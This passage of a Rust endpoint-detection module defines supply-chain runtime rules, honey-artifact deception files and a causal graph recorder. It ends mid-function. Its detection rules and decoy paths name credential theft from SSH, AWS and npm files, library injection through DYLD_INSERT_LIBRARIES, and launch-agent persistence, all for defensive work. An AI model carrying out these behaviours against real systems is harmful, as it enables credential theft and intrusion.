//! Endpoint detection, deception, and causal graph primitives.
//!
//! This module is intentionally pure and deterministic. Platform sensors feed
//! observations into it; the logic here classifies supply-chain runtime risk,
//! models safe honey artifacts, and records local causal evidence without
//! depending on a specific EDR transport.

use std::collections::{BTreeMap, BTreeSet, VecDeque};
use std::fs::{self, OpenOptions};
use std::io::{ErrorKind, Write as _};
use std::path::{Component, Path, PathBuf};

use anyhow::{anyhow, Context, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};

use crate::event::{
    FileEventData, NetworkEventData, PolicyEvent, PolicyEventData, PolicyEventType,
};

const FNV_OFFSET: u64 = 0xcbf2_9ce4_8422_2325;
const FNV_PRIME: u64 = 0x0000_0100_0000_01b3;

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SignatureTrust {
    #[default]
    Unknown,
    Unsigned,
    AdHoc,
    Signed,
    Notarized,
    Invalid,
    Drifted,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub struct CodeSignatureStatus {
    pub trust: SignatureTrust,
    pub team_id: Option<String>,
    pub signing_id: Option<String>,
    pub cdhash: Option<String>,
    pub expected_cdhash: Option<String>,
    pub notarized: Option<bool>,
}

impl CodeSignatureStatus {
    #[must_use]
    pub fn has_drift(&self) -> bool {
        if matches!(
            self.trust,
            SignatureTrust::Invalid | SignatureTrust::Drifted
        ) {
            return true;
        }

        match (&self.cdhash, &self.expected_cdhash) {
            (Some(actual), Some(expected)) => {
                !actual.trim().is_empty() && !expected.trim().is_empty() && actual != expected
            }
            _ => false,
        }
    }

    #[must_use]
    pub fn is_untrusted_runtime_binary(&self) -> bool {
        matches!(
            self.trust,
            SignatureTrust::Unsigned | SignatureTrust::AdHoc | SignatureTrust::Invalid
        ) || self.notarized == Some(false)
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub struct EndpointProcess {
    pub pid: Option<u32>,
    pub ppid: Option<u32>,
    pub process_guid: Option<String>,
    pub parent_process_guid: Option<String>,
    pub image: Option<String>,
    pub command_line: Option<String>,
    pub cwd: Option<String>,
    pub signing: CodeSignatureStatus,
}

impl EndpointProcess {
    #[must_use]
    pub fn stable_key(&self) -> String {
        self.process_guid
            .as_deref()
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(|value| format!("guid:{value}"))
            .or_else(|| self.pid.map(|pid| format!("pid:{pid}")))
            .or_else(|| {
                self.image
                    .as_deref()
                    .map(str::trim)
                    .filter(|value| !value.is_empty())
                    .map(|image| {
                        let command_line = self.command_line.as_deref().unwrap_or_default();
                        format!("image:{image}:{command_line}")
                    })
            })
            .unwrap_or_else(|| "process:unknown".to_string())
    }
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum EndpointEvent {
    ProcessExec {
        image: String,
        #[serde(default)]
        args: Vec<String>,
        #[serde(default)]
        env: BTreeMap<String, String>,
    },
    FileAccess {
        operation: FileOperation,
        path: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        source_url: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        content_preview: Option<String>,
    },
    NetworkFlow {
        host: String,
        port: u16,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        protocol: Option<String>,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        url: Option<String>,
    },
    PackageScript {
        manager: PackageManager,
        package: Option<String>,
        phase: String,
        script: String,
        working_directory: Option<String>,
    },
    DylibLoad {
        path: String,
        target_image: Option<String>,
        mechanism: Option<String>,
    },
    LaunchPersistence {
        path: String,
        label: Option<String>,
        operation: FileOperation,
    },
    BrowserExtensionInstall {
        browser: String,
        extension_id: Option<String>,
        path: String,
        source: Option<String>,
    },
    BrowserDownload {
        browser: String,
        path: String,
        source_url: Option<String>,
    },
    CredentialAccess {
        kind: CredentialKind,
        path: Option<String>,
        name: Option<String>,
    },
    ToolCall {
        tool_name: String,
        #[serde(default)]
        parameters: serde_json::Value,
    },
    PolicyDecision {
        action: String,
        target: Option<String>,
        decision: String,
        guard: Option<String>,
        severity: Option<String>,
    },
    Other {
        category: String,
        #[serde(default)]
        fields: BTreeMap<String, serde_json::Value>,
    },
}

impl EndpointEvent {
    #[must_use]
    pub fn kind_name(&self) -> &'static str {
        match self {
            Self::ProcessExec { .. } => "process_exec",
            Self::FileAccess { .. } => "file_access",
            Self::NetworkFlow { .. } => "network_flow",
            Self::PackageScript { .. } => "package_script",
            Self::DylibLoad { .. } => "dylib_load",
            Self::LaunchPersistence { .. } => "launch_persistence",
            Self::BrowserExtensionInstall { .. } => "browser_extension_install",
            Self::BrowserDownload { .. } => "browser_download",
            Self::CredentialAccess { .. } => "credential_access",
            Self::ToolCall { .. } => "tool_call",
            Self::PolicyDecision { .. } => "policy_decision",
            Self::Other { .. } => "other",
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FileOperation {
    Read,
    Write,
    Create,
    Delete,
    Rename,
    Execute,
    Chmod,
    #[default]
    Unknown,
}

impl FileOperation {
    fn from_policy_operation(operation: Option<&str>, event_type: &PolicyEventType) -> Self {
        match operation
            .map(str::trim)
            .map(str::to_ascii_lowercase)
            .as_deref()
        {
            Some("read" | "open" | "file_read") => Self::Read,
            Some("write" | "file_write") => Self::Write,
            Some("create") => Self::Create,
            Some("delete" | "unlink") => Self::Delete,
            Some("rename" | "move") => Self::Rename,
            Some("execute" | "exec") => Self::Execute,
            Some("chmod") => Self::Chmod,
            _ if *event_type == PolicyEventType::FileRead => Self::Read,
            _ if *event_type == PolicyEventType::FileWrite => Self::Write,
            _ => Self::Unknown,
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PackageManager {
    Npm,
    Pnpm,
    Yarn,
    Pip,
    Cargo,
    Brew,
    Go,
    Gem,
    Other(String),
}

impl PackageManager {
    #[must_use]
    pub fn as_str(&self) -> &str {
        match self {
            Self::Npm => "npm",
            Self::Pnpm => "pnpm",
            Self::Yarn => "yarn",
            Self::Pip => "pip",
            Self::Cargo => "cargo",
            Self::Brew => "brew",
            Self::Go => "go",
            Self::Gem => "gem",
            Self::Other(value) => value.as_str(),
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CredentialKind {
    SshKey,
    ApiToken,
    CloudCredential,
    PackageRegistryToken,
    BrowserCookie,
    SigningKey,
    Other(String),
}

impl CredentialKind {
    #[must_use]
    pub fn as_str(&self) -> &str {
        match self {
            Self::SshKey => "ssh_key",
            Self::ApiToken => "api_token",
            Self::CloudCredential => "cloud_credential",
            Self::PackageRegistryToken => "package_registry_token",
            Self::BrowserCookie => "browser_cookie",
            Self::SigningKey => "signing_key",
            Self::Other(value) => value.as_str(),
        }
    }
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub struct EndpointObservation {
    pub observation_id: String,
    pub timestamp: DateTime<Utc>,
    pub host_id: Option<String>,
    pub user_id: Option<String>,
    pub session_id: Option<String>,
    pub process: EndpointProcess,
    pub event: EndpointEvent,
    pub metadata: BTreeMap<String, serde_json::Value>,
}

impl Default for EndpointObservation {
    fn default() -> Self {
        Self {
            observation_id: stable_id("obs", ["default"]),
            timestamp: Utc::now(),
            host_id: None,
            user_id: None,
            session_id: None,
            process: EndpointProcess::default(),
            event: EndpointEvent::Other {
                category: "unknown".to_string(),
                fields: BTreeMap::new(),
            },
            metadata: BTreeMap::new(),
        }
    }
}

impl EndpointObservation {
    #[must_use]
    pub fn event_name(&self) -> &'static str {
        self.event.kind_name()
    }

    #[must_use]
    pub fn from_policy_event(event: &PolicyEvent) -> Self {
        let metadata = metadata_as_btree(event.metadata.as_ref());
        let process = process_from_metadata(&metadata);
        Self {
            observation_id: event.event_id.clone(),
            timestamp: event.timestamp,
            host_id: string_field(&metadata, &["hostId", "host_id", "endpointHostId"]),
            user_id: string_field(&metadata, &["userId", "user_id", "principal"]),
            session_id: event.session_id.clone(),
            process,
            event: endpoint_event_from_policy_event(event),
            metadata,
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DetectionSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DetectionEvidence {
    pub key: String,
    pub value: String,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DetectionFinding {
    pub finding_id: String,
    pub rule_id: String,
    pub title: String,
    pub severity: DetectionSeverity,
    pub confidence: f32,
    pub description: String,
    pub observation_id: String,
    pub timestamp: DateTime<Utc>,
    pub evidence: Vec<DetectionEvidence>,
    pub mitre_attack: Vec<String>,
    pub tags: Vec<String>,
    pub remediation: String,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub struct SupplyChainRuntimeGuard {
    pub honey_artifacts: Vec<HoneyArtifact>,
}

impl SupplyChainRuntimeGuard {
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    #[must_use]
    pub fn with_honey_artifacts(honey_artifacts: Vec<HoneyArtifact>) -> Self {
        Self { honey_artifacts }
    }

    #[must_use]
    pub fn evaluate(&self, observation: &EndpointObservation) -> Vec<DetectionFinding> {
        let mut findings = Vec::new();
        self.detect_supply_chain_behaviors(observation, &mut findings);
        self.detect_honey_access(observation, &mut findings);
        findings
    }

    fn detect_supply_chain_behaviors(
        &self,
        observation: &EndpointObservation,
        findings: &mut Vec<DetectionFinding>,
    ) {
        match &observation.event {
            EndpointEvent::PackageScript {
                manager,
                phase,
                script,
                package,
                working_directory,
            } => {
                let phase_risky = is_install_phase(phase);
                let script_risky = suspicious_script_reason(script);
                if phase_risky || script_risky.is_some() {
                    let mut evidence = vec![
                        ev("manager", manager.as_str()),
                        ev("phase", phase),
                        ev("script", script),
                    ];
                    if let Some(package) = package {
                        evidence.push(ev("package", package));
                    }
                    if let Some(working_directory) = working_directory {
                        evidence.push(ev("workingDirectory", working_directory));
                    }
                    if let Some(reason) = script_risky {
                        evidence.push(ev("scriptRisk", reason));
                    }
                    findings.push(finding(
                        observation,
                        evidence,
                        FindingRule {
                            rule_id: "supply_chain.install_script.risky",
                            title: "Package install script executed risky behavior",
                            severity: DetectionSeverity::High,
                            confidence: 0.86,
                            description: "A package manager lifecycle script attempted behavior commonly used by supply-chain malware.",
                            mitre_attack: vec!["T1195.002", "T1059"],
                            tags: vec!["supply_chain", "package_manager", manager.as_str()],
                            remediation: "Quarantine the package install directory, preserve the lockfile and script body, and replay the install in an isolated sandbox before allowing it again.",
                        },
                    ));
                }
            }
            EndpointEvent::ProcessExec { image, args, env } => {
                if observation.process.signing.is_untrusted_runtime_binary()
                    && path_is_user_writable_or_download(image)
                {
                    findings.push(finding(
                        observation,
                        vec![
                            ev("image", image),
                            ev(
                                "signatureTrust",
                                format!("{:?}", observation.process.signing.trust),
                            ),
                        ],
                        FindingRule {
                            rule_id: "supply_chain.unsigned_binary.dev_path",
                            title: "Unsigned or unnotarized binary executed from writable path",
                            severity: DetectionSeverity::High,
                            confidence: 0.82,
                            description: "A runtime binary without trusted signing executed from a user-writable or download/cache location.",
                            mitre_attack: vec!["T1204", "T1036"],
                            tags: vec!["supply_chain", "unsigned_binary"],
                            remediation: "Block or quarantine the binary until its source, notarization, and expected hash are verified.",
                        },
                    ));
                }

                if observation.process.signing.has_drift() {
                    let mut evidence = vec![ev("image", image)];
                    if let Some(evidence_item) =
                        opt_ev("cdhash", observation.process.signing.cdhash.as_deref())
                    {
                        evidence.push(evidence_item);
                    }
                    if let Some(evidence_item) = opt_ev(
                        "expectedCdhash",
                        observation.process.signing.expected_cdhash.as_deref(),
                    ) {
                        evidence.push(evidence_item);
                    }
                    findings.push(finding(
                        observation,
                        evidence,
                        FindingRule {
                            rule_id: "supply_chain.signature_drift",
                            title: "Code signature or notarization drift detected",
                            severity: DetectionSeverity::Critical,
                            confidence: 0.9,
                            description: "The observed binary signature does not match the expected code directory hash or trust state.",
                            mitre_attack: vec!["T1553.001", "T1036"],
                            tags: vec!["supply_chain", "signature_drift"],
                            remediation: "Stop the process tree, preserve the binary, and compare the artifact against the release manifest before re-enabling it.",
                        },
                    ));
                }

                if command_looks_like_package_manager(image, args)
                    && env
                        .keys()
                        .any(|key| key.eq_ignore_ascii_case("DYLD_INSERT_LIBRARIES"))
                {
                    findings.push(finding(
                        observation,
                        vec![ev("image", image), ev("args", args.join(" "))],
                        FindingRule {
                            rule_id: "supply_chain.package_manager_dylib_injection",
                            title: "Package manager launched with dynamic library injection",
                            severity: DetectionSeverity::Critical,
                            confidence: 0.91,
                            description: "A package manager or developer tool executed with dynamic library injection enabled.",
                            mitre_attack: vec!["T1574.006", "T1195.002"],
                            tags: vec!["supply_chain", "dylib_injection"],
                            remediation: "Terminate the process tree and inspect shell startup files, launch agents, and package scripts for the injection source.",
                        },
                    ));
                }
            }
            EndpointEvent::DylibLoad {
                path,
                mechanism,
                target_image,
            } => {
                let mechanism_risky = mechanism
                    .as_deref()
                    .map(|value| value.eq_ignore_ascii_case("DYLD_INSERT_LIBRARIES"))
                    .unwrap_or(false);
                if mechanism_risky || path_is_user_writable_or_download(path) {
                    let mut evidence = vec![ev("dylibPath", path)];
                    if let Some(evidence_item) = opt_ev("targetImage", target_image.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    if let Some(evidence_item) = opt_ev("mechanism", mechanism.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    findings.push(finding(
                        observation,
                        evidence,
                        FindingRule {
                            rule_id: "supply_chain.dylib_injection",
                            title: "Dynamic library injection into developer/runtime process",
                            severity: DetectionSeverity::Critical,
                            confidence: 0.88,
                            description: "A dynamic library loaded through an injection path or from a writable location.",
                            mitre_attack: vec!["T1574.006"],
                            tags: vec!["supply_chain", "dylib_injection"],
                            remediation: "Capture the target process tree, library file, and environment before terminating or isolating the process.",
                        },
                    ));
                }
            }
            EndpointEvent::LaunchPersistence {
                path,
                label,
                operation,
            } => {
                if path_is_launch_persistence(path) {
                    let mut evidence =
                        vec![ev("path", path), ev("operation", format!("{operation:?}"))];
                    if let Some(evidence_item) = opt_ev("label", label.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    findings.push(finding(
                        observation,
                        evidence,
                        FindingRule {
                            rule_id: "supply_chain.launch_persistence",
                            title: "LaunchAgent or LaunchDaemon persistence changed",
                            severity: DetectionSeverity::High,
                            confidence: 0.84,
                            description: "A launch persistence location was created or modified during endpoint activity.",
                            mitre_attack: vec!["T1543.001"],
                            tags: vec!["persistence", "supply_chain"],
                            remediation: "Disable the launch item, preserve the plist, and trace the writing process back to its package or tool origin.",
                        },
                    ));
                }
            }
            EndpointEvent::BrowserExtensionInstall {
                browser,
                extension_id,
                path,
                source,
            } => {
                let unmanaged = source
                    .as_deref()
                    .map(|value| !value.eq_ignore_ascii_case("managed"))
                    .unwrap_or(true);
                if unmanaged && path_looks_like_browser_extension(path) {
                    let mut evidence = vec![ev("browser", browser), ev("path", path)];
                    if let Some(evidence_item) = opt_ev("extensionId", extension_id.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    if let Some(evidence_item) = opt_ev("source", source.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    findings.push(finding(
                        observation,
                        evidence,
                        FindingRule {
                            rule_id: "supply_chain.unmanaged_browser_extension",
                            title: "Unmanaged browser extension installed or modified",
                            severity: DetectionSeverity::Medium,
                            confidence: 0.78,
                            description: "A browser extension changed outside an explicitly managed deployment channel.",
                            mitre_attack: vec!["T1176"],
                            tags: vec!["browser_extension", "supply_chain"],
                            remediation: "Disable the extension, preserve its manifest, and verify its source and permissions before allowing it.",
                        },
                    ));
                }
            }
            EndpointEvent::CredentialAccess { kind, path, name } => {
                let path_risky = path
                    .as_deref()
                    .map(path_looks_like_developer_secret)
                    .unwrap_or(false);
                if path_risky || matches!(kind, CredentialKind::PackageRegistryToken) {
                    let mut evidence = vec![ev("credentialKind", kind.as_str())];
                    if let Some(evidence_item) = opt_ev("path", path.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    if let Some(evidence_item) = opt_ev("name", name.as_deref()) {
                        evidence.push(evidence_item);
                    }
                    findings.push(finding(
                        observation,
                        evidence,
                        FindingRule {
                            rule_id: "supply_chain.developer_secret_access",
                            title: "Developer credential material accessed",
                            severity: DetectionSeverity::High,
                            confidence: 0.8,
                            description: "A process accessed package, cloud, SSH, browser, or signing credential material.",
                            mitre_attack: vec!["T1552.001", "T1555"],
                            tags: vec!["credential_access", "supply_chain"],
                            remediation: "Rotate the touched credential if access was not expected and inspect the causal graph for follow-on network egress.",
                        },
                    ));
                }
            }
            _ => {}
        }
    }

    fn detect_honey_access(
        &self,
        observation: &EndpointObservation,
        findings: &mut Vec<DetectionFinding>,
    ) {
        let Some(accessed_path) = observed_path(observation) else {
            return;
        };

        for artifact in &self.honey_artifacts {
            if artifact.matches_path(accessed_path)
                || observation_contains_marker(observation, &artifact.marker)
            {
                findings.push(finding(
                    observation,
                    vec![
                        ev("artifactId", &artifact.artifact_id),
                        ev("artifactKind", artifact.kind.as_str()),
                        ev("observedPath", accessed_path),
                        ev("artifactPath", artifact.relative_path.display().to_string()),
                    ],
                    FindingRule {
                        rule_id: "deception.honey_artifact_touched",
                        title: "Honey artifact was touched",
                        severity: DetectionSeverity::Critical,
                        confidence: 0.97,
                        description: "A planted deception artifact was accessed. This is a high-confidence endpoint compromise or misuse signal.",
                        mitre_attack: vec!["T1552.001", "T1005"],
                        tags: vec!["deception", "honey_artifact", artifact.kind.as_str()],
                        remediation: "Immediately preserve the process tree, isolate network egress for the actor, and rotate any real credentials adjacent to the honey artifact.",
                    },
                ));
            }
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HoneyArtifactKind {
    SshPrivateKey,
    ApiTokenFile,
    CloudCredentials,
    PackageRegistryToken,
    BrowserCookieJar,
    InternalHostname,
}

impl HoneyArtifactKind {
    #[must_use]
    pub fn as_str(&self) -> &str {
        match self {
            Self::SshPrivateKey => "ssh_private_key",
            Self::ApiTokenFile => "api_token_file",
            Self::CloudCredentials => "cloud_credentials",
            Self::PackageRegistryToken => "package_registry_token",
            Self::BrowserCookieJar => "browser_cookie_jar",
            Self::InternalHostname => "internal_hostname",
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct HoneyArtifact {
    pub artifact_id: String,
    pub kind: HoneyArtifactKind,
    pub relative_path: PathBuf,
    pub marker: String,
    pub contents: String,
    pub permissions_octal: u32,
    pub tags: Vec<String>,
}

impl HoneyArtifact {
    #[must_use]
    pub fn absolute_path(&self, root: &Path) -> PathBuf {
        root.join(&self.relative_path)
    }

    #[must_use]
    pub fn matches_path(&self, path: &str) -> bool {
        let observed = normalize_path_string(path);
        let relative = normalize_path_string(&self.relative_path.display().to_string());
        observed == relative || observed.ends_with(&format!("/{relative}"))
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DeceptionPlan {
    pub root: PathBuf,
    pub endpoint_id: String,
    pub artifacts: Vec<HoneyArtifact>,
}

impl DeceptionPlan {
    #[must_use]
    pub fn standard(root: impl Into<PathBuf>, endpoint_id: impl Into<String>) -> Self {
        let root = root.into();
        let endpoint_id = endpoint_id.into();
        let artifact_specs = [
            (HoneyArtifactKind::SshPrivateKey, ".ssh/id_prod_ed25519"),
            (
                HoneyArtifactKind::ApiTokenFile,
                ".config/clawdstrike/tokens/prod-api-token.txt",
            ),
            (HoneyArtifactKind::CloudCredentials, ".aws/credentials"),
            (HoneyArtifactKind::PackageRegistryToken, ".npmrc"),
            (
                HoneyArtifactKind::BrowserCookieJar,
                "Library/Application Support/ClawdStrike/Honey/Cookies.json",
            ),
            (
                HoneyArtifactKind::InternalHostname,
                ".config/clawdstrike/internal-hosts.txt",
            ),
        ];

        let artifacts = artifact_specs
            .into_iter()
            .map(|(kind, relative_path)| honey_artifact(&endpoint_id, kind, relative_path))
            .collect();

        Self {
            root,
            endpoint_id,
            artifacts,
        }
    }

    pub fn materialize(&self) -> Result<DeceptionMaterializationReport> {
        let mut created = Vec::new();
        let mut skipped = Vec::new();

        for artifact in &self.artifacts {
            ensure_safe_relative_path(&artifact.relative_path)?;
            let path = artifact.absolute_path(&self.root);
            let Some(parent) = path.parent() else {
                return Err(anyhow!(
                    "honey artifact path has no parent: {}",
                    path.display()
                ));
            };
            fs::create_dir_all(parent)
                .with_context(|| format!("create honey artifact directory {}", parent.display()))?;

            match create_new_honey_file(&path, artifact) {
                Ok(()) => created.push(path.display().to_string()),
                Err(err) if err.kind() == ErrorKind::AlreadyExists => {
                    skipped.push(path.display().to_string());
                }
                Err(err) => {
                    return Err(err)
                        .with_context(|| format!("create honey artifact {}", path.display()));
                }
            }
        }

        Ok(DeceptionMaterializationReport { created, skipped })
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DeceptionMaterializationReport {
    pub created: Vec<String>,
    pub skipped: Vec<String>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CausalNodeKind {
    Process,
    File,
    Network,
    PackageScript,
    Credential,
    BrowserDownload,
    BrowserExtension,
    PolicyDecision,
    Tool,
    DeceptionArtifact,
    Other,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CausalNode {
    pub node_id: String,
    pub kind: CausalNodeKind,
    pub label: String,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    #[serde(default)]
    pub attributes: BTreeMap<String, serde_json::Value>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CausalEdgeKind {
    Spawned,
    Executed,
    Read,
    Wrote,
    Connected,
    RanScript,
    LoadedLibrary,
    CreatedPersistence,
    InstalledExtension,
    Downloaded,
    AccessedCredential,
    MadeDecision,
    TemporalNext,
    TouchedHoney,
    Related,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CausalEdge {
    pub edge_id: String,
    pub from: String,
    pub to: String,
    pub kind: CausalEdgeKind,
    pub timestamp: DateTime<Utc>,
    pub observation_id: String,
    #[serde(default)]
    pub attributes: BTreeMap<String, serde_json::Value>,
}

#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase")]
pub struct CausalGraph {
    pub nodes: BTreeMap<String, CausalNode>,
    pub edges: Vec<CausalEdge>,
}

#[derive(Clone, Debug, Default)]
pub struct CausalGraphRecorder {
    graph: CausalGraph,
    last_node_by_session: BTreeMap<String, String>,
    process_nodes: BTreeMap<String, String>,
}

impl CausalGraphRecorder {
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    #[must_use]
    pub fn graph(&self) -> &CausalGraph {
        &self.graph
    }

    pub fn into_graph(self) -> CausalGraph {
        self.graph
    }

    pub fn record_observation(&mut self, observation: &EndpointObservation) -> Vec<String> {
        let mut touched = Vec::new();
        let process_node = self.process_node(observation);
        touched.push(process_node.clone());

        if let Some(parent_guid) = observation
            .process
            .parent_process_guid
            .as_deref()
            .map(str::trim)
            .filter(|value| !value.is_empty())
        {
            let parent = self.ensure_node(
                CausalNodeKind::Process,
                format!("process:{parent_guid}"),
                parent_guid.to_string(),
                observation.timestamp,
                BTreeMap::new(),
            );
            self.add_edge(
                parent,
                process_node.clone(),
                CausalEdgeKind::Spawned,
                observation,
                BTreeMap::new(),
            );
        }

        if let Some((event_node, edge_kind)) = self.event_node(observation) {
            self.add_edge(
                process_node,
                event_node.clone(),
                edge_kind,
                observation,
                BTreeMap::new(),
            );
            self.add_temporal_edge(observation, &event_node);
            touched.push(event_node);
        } else {
            self.add_temporal_edge(observation, &process_node);
        }

        touched
    }

    #[must_use]
    pub fn causal_path(&self, from: &str, to: &str) -> Option<Vec<String>> {
        if from == to {
            return Some(vec![from.to_string()]);
        }

        let mut queue = VecDeque::from([from.to_string()]);
        let mut seen = BTreeSet::from([from.to_string()]);
        let mut previous: BTreeMap<String, String> = BTreeMap::new();

        while let Some(node) = queue.pop_front() {
            for edge in self.graph.edges.iter().filter(|edge| edge.from == node) {
                if !seen.insert(edge.to.clone()) {
                    continue;
                }
                previous.insert(edge.to.clone(), node.clone());
                if edge.to == to {
                    return Some(reconstruct_path(from, to, &previous));
                }
                queue.push_back(edge.to.clone());
            }
        }

        None
    }

    fn process_node(&mut self, observation: &EndpointObservation) -> String {
        let key = observation.process.stable_key();
        if let Some(node_id) = self.process_nodes.get(&key).cloned() {
            self.touch_node(&node_id, observation.timestamp);
            return node_id;
        }

        let label = observation
            .process
            .image
            .clone()
            .or_else(|| observation.process.command_line.clone())
            .unwrap_or_else(|| key.clone());
        let mut attributes = BTreeMap::new();
        insert_json(&mut attributes, "pid", observation.process.pid);
        insert_json(&mut attributes, "ppid", observation.process.ppid);
        insert_json(
            &mut attributes,
            "commandLine",
            &observation.process.command_line,
        );
        insert_json(&mut attributes, "cwd", &observation.process.cwd);
        insert_json(&mut attributes, "signing", &observation.process.signing);

        let node_id = self.ensure_node(
            CausalNodeKind::Process,
            key.clone(),
            label,
            observation.timestamp,
            attributes,
        );
        self.process_nodes.insert(key, node_id.clone());
        node_id
    }

    fn event_node(
        &mut self,
        observation: &EndpointObservation,
    ) -> Option<(String, CausalEdgeKind)> {
        match &observation.event {
            EndpointEvent::ProcessExec { image, args, .. } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "args", args);
                Some((
                    self.ensure_node(
                        CausalNodeKind::File,
                        format!("exec:{image}"),
                        image.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::Executed,
                ))
            }
            EndpointEvent::FileAccess {
                operation, path, ..
            } => Some((
                self.ensure_node(
                    CausalNodeKind::File,
                    format!("file:{}", normalize_path_string(path)),
                    path.clone(),
                    observation.timestamp,
                    BTreeMap::new(),
                ),
                match operation {
                    FileOperation::Write
                    | FileOperation::Create
                    | FileOperation::Delete
                    | FileOperation::Rename
                    | FileOperation::Chmod => CausalEdgeKind::Wrote,
                    _ => CausalEdgeKind::Read,
                },
            )),
            EndpointEvent::NetworkFlow {
                host,
                port,
                protocol,
                url,
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "protocol", protocol);
                insert_json(&mut attributes, "url", url);
                Some((
                    self.ensure_node(
                        CausalNodeKind::Network,
                        format!("net:{host}:{port}"),
                        format!("{host}:{port}"),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::Connected,
                ))
            }
            EndpointEvent::PackageScript {
                manager,
                package,
                phase,
                script,
                ..
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "manager", manager.as_str());
                insert_json(&mut attributes, "package", package);
                insert_json(&mut attributes, "phase", phase);
                insert_json(&mut attributes, "script", script);
                Some((
                    self.ensure_node(
                        CausalNodeKind::PackageScript,
                        format!("script:{}:{}:{script}", manager.as_str(), phase),
                        format!("{} {phase}", manager.as_str()),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::RanScript,
                ))
            }
            EndpointEvent::DylibLoad { path, .. } => Some((
                self.ensure_node(
                    CausalNodeKind::File,
                    format!("dylib:{}", normalize_path_string(path)),
                    path.clone(),
                    observation.timestamp,
                    BTreeMap::new(),
                ),
                CausalEdgeKind::LoadedLibrary,
            )),
            EndpointEvent::LaunchPersistence { path, label, .. } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "label", label);
                Some((
                    self.ensure_node(
                        CausalNodeKind::File,
                        format!("launch:{}", normalize_path_string(path)),
                        path.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::CreatedPersistence,
                ))
            }
            EndpointEvent::BrowserExtensionInstall {
                browser,
                extension_id,
                path,
                ..
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "browser", browser);
                insert_json(&mut attributes, "extensionId", extension_id);
                Some((
                    self.ensure_node(
                        CausalNodeKind::BrowserExtension,
                        format!(
                            "browser_extension:{browser}:{}",
                            normalize_path_string(path)
                        ),
                        path.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::InstalledExtension,
                ))
            }
            EndpointEvent::BrowserDownload {
                browser,
                path,
                source_url,
            } => {
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "browser", browser);
                insert_json(&mut attributes, "sourceUrl", source_url);
                Some((
                    self.ensure_node(
                        CausalNodeKind::BrowserDownload,
                        format!("download:{}", normalize_path_string(path)),
                        path.clone(),
                        observation.timestamp,
                        attributes,
                    ),
                    CausalEdgeKind::Downloaded,
                ))
            }
            EndpointEvent::CredentialAccess { kind, path, name } => {
                let key = path
                    .clone()
                    .or_else(|| name.clone())
                    .unwrap_or_else(|| kind.as_str().to_string());
                let mut attributes = BTreeMap::new();
                insert_json(&mut attributes, "credentialKind", kind.as_str());
                insert_json(&mut attributes, "path", path);
